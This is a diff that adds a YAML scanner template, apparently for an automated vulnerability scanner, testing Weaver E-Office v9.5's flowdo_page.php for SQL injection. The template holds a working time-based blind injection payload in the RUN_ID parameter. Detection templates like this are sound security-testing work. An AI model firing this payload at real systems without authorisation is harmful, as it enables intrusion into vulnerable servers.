@@ -1,0 +1,13 @@
+name: 泛微-EOffice-v9.5-flowdo_page-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /E-mobile/flowdo_page.php?diff=delete&RUN_ID=1+AND+2220%3DBENCHMARK%283500000%2CMD5%280x4d756974%29%29
+    follow_redirects: false
+    expression:
+      sleep: 4
+      body_all:
+        - "success"
